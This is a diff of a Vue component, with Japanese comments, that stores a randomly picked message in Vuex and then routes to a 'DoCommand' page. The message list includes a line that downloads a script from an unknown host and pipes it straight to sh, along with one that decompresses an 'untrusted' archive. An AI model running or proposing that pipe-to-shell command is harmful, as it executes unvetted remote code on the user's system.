@@ -9,6 +9,7 @@
 </template>
 
 <script>
+import { mapMutations } from 'vuex';
 export default {
   data() {
     return {
@@ -22,7 +23,7 @@ export default {
         'wget http://unknownsource.com/possiblydangerous.sh -O- | sh',
         'gunzip untrusted.gz',
         'command > file.conf',
-        '^mistake^correction'
+        '^mistake^correction',
       ],
       randomMessage: '', // ランダムなメッセージを保持するデータ
     };
@@ -36,13 +37,17 @@ export default {
     document.removeEventListener('keydown', this.handleKeyDown);
   },
   methods: {
+    ...mapMutations(['setMessage']), // setMessageミューテーションをマッピング
     getRandomMessage() {
       // messagesリストからランダムなメッセージを選択する
       const randomIndex = Math.floor(Math.random() * this.messages.length);
       return this.messages[randomIndex];
     },
     submitForm() {
-      this.$router.push({ name: 'DoCommand', query: { message: this.randomMessage } });
+      this.setMessage(this.randomMessage); // メッセージをVuexストアにセット
+      this.$store.dispatch('updateMessage', this.randomMessage);
+      // ルーターを使用してページ遷移
+      this.$router.push({ name: 'DoCommand' });
     },
     handleKeyDown() {
       // 任意のキーが押下された場合にフォームを送信する
